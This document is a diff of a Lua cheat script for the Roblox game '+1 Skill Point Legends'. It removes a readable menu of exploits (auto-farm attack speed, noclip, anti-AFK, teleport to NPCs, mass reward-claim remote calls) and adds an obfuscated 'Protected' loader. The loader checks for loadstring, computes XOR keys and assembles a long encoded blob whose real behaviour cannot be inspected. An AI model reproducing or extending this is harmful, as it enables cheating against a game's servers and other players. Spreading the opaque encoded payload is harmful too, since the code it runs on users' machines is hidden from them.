-local minusF = frame(atkRowF, PINK, UDim2.fromOffset(26, 20), UDim2.fromOffset(180, 5), 13)
-corner(minusF, 5)
-label(minusF, "-", UDim2.fromOffset(26, 20), UDim2.fromOffset(0, 0), WHITE, 13, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 14)
-hitbox(minusF, 26, 20, 15, function()
-    CFG.AttackSpeed = math.max(0.1, math.floor((CFG.AttackSpeed - 0.1) * 10 + 0.5) / 10)
-    atkLbl.Text = CFG.AttackSpeed .. "s"
-end)
-
--- plus button
-local plusF = frame(atkRowF, PINK, UDim2.fromOffset(26, 20), UDim2.fromOffset(248, 5), 13)
-corner(plusF, 5)
-label(plusF, "+", UDim2.fromOffset(26, 20), UDim2.fromOffset(0, 0), WHITE, 13, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 14)
-hitbox(plusF, 26, 20, 15, function()
-    CFG.AttackSpeed = math.min(3.0, math.floor((CFG.AttackSpeed + 0.1) * 10 + 0.5) / 10)
-    atkLbl.Text = CFG.AttackSpeed .. "s"
-end)
-
--- ── UTILITY ──────────────────────────────────────────────────────────────────
-
-L(sectionHeader(nil, "UTILITY", 12))
-L(makeToggle(nil, "Anti-AFK",          "AntiAFK",    12))
-L(makeToggle(nil, "Noclip",            "Noclip",     12))
-L(makeToggle(nil, "Auto Heal",         "AutoHeal",   12))
-L(makeToggle(nil, "Auto Open Chests",  "AutoChest",  12))
-L(makeToggle(nil, "Auto Use Potions",  "AutoPotion", 12))
-L(makeToggle(nil, "Auto Claim Daily",  "AutoDaily",  12))
-
--- ── QUICK ACTIONS ────────────────────────────────────────────────────────────
-
-L(sectionHeader(nil, "QUICK ACTIONS", 12))
-
--- Row 1: TP + Claim All
-local actRow1 = frame(nil, Color3.new(), UDim2.fromOffset(280, 30), nil, 12)
-actRow1.BackgroundTransparency = 1
-L(actRow1)
-listLayout(actRow1, Enum.FillDirection.Horizontal, 6, Enum.HorizontalAlignment.Left, Enum.VerticalAlignment.Center)
-makeBtn(actRow1, "TP to Nearest NPC", 135, 26, 13, function()
-    local npc = findNearestNPC()
-    if npc then tpToNPC(npc) end
-end)
-makeBtn(actRow1, "Claim All Rewards", 135, 26, 13, function()
-    pcall(function() Interactions.claimLikeReward.send() end)
-    pcall(function() Interactions.onOfflineRewardClaim.send() end)
-    pcall(function() Interactions.onRankRewardClaim.send() end)
-    pcall(function() Interactions.dailyRewardClaim.send() end)
-end)
-
--- Row 2: Individual claim buttons
-local actRow2 = frame(nil, Color3.new(), UDim2.fromOffset(280, 30), nil, 12)
-actRow2.BackgroundTransparency = 1
-L(actRow2)
-listLayout(actRow2, Enum.FillDirection.Horizontal, 6, Enum.HorizontalAlignment.Left, Enum.VerticalAlignment.Center)
-makeBtn(actRow2, "Offline Reward", 89, 26, 13, function()
-    pcall(function() Interactions.onOfflineRewardClaim.send() end)
-end)
-makeBtn(actRow2, "Rank Reward", 89, 26, 13, function()
-    pcall(function() Interactions.onRankRewardClaim.send() end)
-end)
-makeBtn(actRow2, "Like Reward", 89, 26, 13, function()
-    pcall(function() Interactions.claimLikeReward.send() end)
-end)
-
-spacer(leftC, 280, 8, 12)
-
--- ─── VERTICAL DIVIDER ────────────────────────────────────────────────────────
-
-frame(main, BORDER, UDim2.fromOffset(1, SCROLL_H), UDim2.fromOffset(LEFT_W + 10, CONTENT_Y + 4), 11)
-
--- ─── RIGHT PANEL (Stats) ──────────────────────────────────────────────────────
-
-local RIGHT_X = LEFT_W + 16
-local RIGHT_W = 220
-
-local rightScroll = Instance.new("ScrollingFrame")
-rightScroll.BackgroundTransparency = 1
-rightScroll.Size                   = UDim2.fromOffset(RIGHT_W, SCROLL_H)
-rightScroll.Position               = UDim2.fromOffset(RIGHT_X + 4, CONTENT_Y + 4)
-rightScroll.CanvasSize             = UDim2.fromOffset(0, 0)
-rightScroll.ScrollBarThickness     = 3
-rightScroll.ScrollBarImageColor3   = PINK
-rightScroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-rightScroll.ZIndex                 = 11
-rightScroll.Parent                 = main
-
-local rightC = frame(rightScroll, Color3.new(), UDim2.fromOffset(RIGHT_W - 4, 10), nil, 12)
-rightC.BackgroundTransparency = 1
-listLayout(rightC, Enum.FillDirection.Vertical, 4)
-
-local function R(inst)
-    inst.Parent = rightC
-end
-
--- PLAYER section
-R(rightHeader(nil, "PLAYER", 12))
-local _, rSP   = statRow(nil, "Skill Points", "--",  12); R(_)
-local _, rRank = statRow(nil, "Rank",          "--",  12); R(_)
-local _, rZone = statRow(nil, "Zone",          "--",  12); R(_)
-local _, rWep  = statRow(nil, "Weapon",        "--",  12); R(_)
-
--- SESSION section
-R(rightHeader(nil, "SESSION", 12))
-local _, rKills   = statRow(nil, "Kills",      "0",   12); R(_)
-local _, rSPGain  = statRow(nil, "SP Gained",  "0",   12); R(_)
-local _, rTarget  = statRow(nil, "Stat Target", CFG.StatTarget, 12); R(_)
-local _, rSpeed   = statRow(nil, "Atk Speed",  CFG.AttackSpeed .. "s", 12); R(_)
-
--- NPC INFO section
-R(rightHeader(nil, "NPC INFO", 12))
-local _, rNearNPC = statRow(nil, "Nearest NPC", "--", 12); R(_)
-local _, rDist    = statRow(nil, "Distance",    "--", 12); R(_)
-local _, rFarmSt  = statRow(nil, "Farm Status", "Off", 12); R(_)
-
-spacer(rightC, 196, 8, 12)
-
--- ─── STATUS UPDATER ──────────────────────────────────────────────────────────
-
-task.spawn(function()
-    while true do
-        pcall(function()
-            local ls   = Player:FindFirstChild("leaderstats")
-            local sp   = ls and ls:FindFirstChild("SP")   and ls.SP.Value   or 0
-            local rank = ls and ls:FindFirstChild("Rank") and ls.Rank.Value or "--"
-            local zone = Player:GetAttribute("Zone") or "--"
-
-            -- Weapon name
-            local wepName = "--"
-            pcall(function()
-                local inv      = fus.peek(Values.inventory)
-                local equipped = fus.peek(Values.equippedItems)
-                if inv and equipped then
-                    for _, item in equipped do
-                        if inv[item] and inv[item].type == "weapon" then
-                            wepName = item
-                            break
-                        end
-                    end
-                end
-            end)
-
-            -- Nearest NPC
-            local nearNPC  = findNearestNPC()
-            local nearName = "--"
-            local nearDist = "--"
-            if nearNPC then
-                nearName = getNpcName(nearNPC)
-                local hrp  = getHRP()
-                local root = nearNPC:FindFirstChild("HumanoidRootPart") or nearNPC:FindFirstChild("Root")
-                if hrp and root then
-                    nearDist = math.floor((hrp.Position - root.Position).Magnitude) .. "m"
-                end
-            end
-
-            -- Status bar
-            local farmStr = CFG.AutoFarm and "Farming" or "Idle"
-            statusLbl.Text = farmStr .. "  |  SP: " .. formatNum(sp) .. "  |  Kills: " .. _kills
-            statusDot.BackgroundColor3 = CFG.AutoFarm and GREEN or OFF_GRAY
-
-            -- Right panel values
-            rSP.Text    = formatNum(sp)
-            rRank.Text  = tostring(rank)
-            rZone.Text  = tostring(zone)
-            rWep.Text   = wepName
-
-            rKills.Text  = tostring(_kills)
-            rSPGain.Text = formatNum(math.max(0, _spGained))
-            rTarget.Text = CFG.StatTarget
-            rSpeed.Text  = CFG.AttackSpeed .. "s"
-
-            rNearNPC.Text = nearName
-            rDist.Text    = nearDist
-            rFarmSt.Text  = CFG.AutoFarm and "Active" or "Off"
-            rFarmSt.TextColor3 = CFG.AutoFarm and GREEN or OFF_GRAY
-        end)
-        task.wait(1)
-    end
-end)
-
--- ─── DRAG ────────────────────────────────────────────────────────────────────
-
-local dragging   = false
-local dragStart  = nil
-local dragOrigin = nil
-
-titleBar.Active = true
-titleBar.InputBegan:Connect(function(inp)
-    if inp.UserInputType == Enum.UserInputType.MouseButton1
-    or inp.UserInputType == Enum.UserInputType.Touch then
-        dragging   = true
-        dragStart  = inp.Position
-        dragOrigin = main.Position
-        inp.Changed:Connect(function()
-            if inp.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(inp)
-    if not dragging then return end
-    if inp.UserInputType == Enum.UserInputType.MouseMovement
-    or inp.UserInputType == Enum.UserInputType.Touch then
-        local delta = inp.Position - dragStart
-        main.Position = UDim2.fromOffset(
-            dragOrigin.X.Offset + delta.X,
-            dragOrigin.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- ─── MINIMIZE ────────────────────────────────────────────────────────────────
-
-local _minimized = false
-hitbox(minFrame, 24, 24, 15, function()
-    _minimized = not _minimized
-    TweenService:Create(main, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
-        Size = UDim2.fromOffset(MAIN_W, _minimized and TITLE_H or MAIN_H)
-    }):Play()
-    minLbl.Text = _minimized and "+" or "—"
-end)
-
--- ─── CLOSE ───────────────────────────────────────────────────────────────────
-
-hitbox(closeFrame, 24, 24, 15, function()
-    stopFarm()
-    gui:Destroy()
-end)
-
-print("[SPL] Aurora v2 loaded — +1 Skill Point Legends by notCitruss")
+-- Aurora | Protected
+-- Unauthorized redistribution prohibited
+
+local JrpjRalq9k52Lq = (function()
+  local _g = getfenv or function() return _G end
+  local _e = _g()
+  if not _e.game then return false end
+  if not _e.loadstring then return false end
+  return true
+end)()
+if not JrpjRalq9k52Lq then return end
+
+local function CiMSwvesyu6Spl(_x) return bit32.bnot(_x) end
+
+local R4ZibxR4_zxigL = {(144+-102),(119+78),(287-83),bit32.bxor(53,46),bit32.bxor(138,42),(148+-45),(5*2),(302-52)}
+for _i=1,#R4ZibxR4_zxigL do R4ZibxR4_zxigL[_i]=math.floor(R4ZibxR4_zxigL[_i]) end
+local SpI9JpoXQQ4f85 = {bit32.bxor(129,25),(156-99),(53*2),(54*2),(179-109),bit32.bxor(68,71)}
+for _i=1,#SpI9JpoXQQ4f85 do SpI9JpoXQQ4f85[_i]=math.floor(SpI9JpoXQQ4f85[_i]) end
+local gUGh_tVNDUwQ0B = 7
+
+local function WQqhQFlhhE2v3x(_x) return bit32.bnot(_x) end
+
+local vxFsHp0JSeuh2b = table.concat({
+"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",
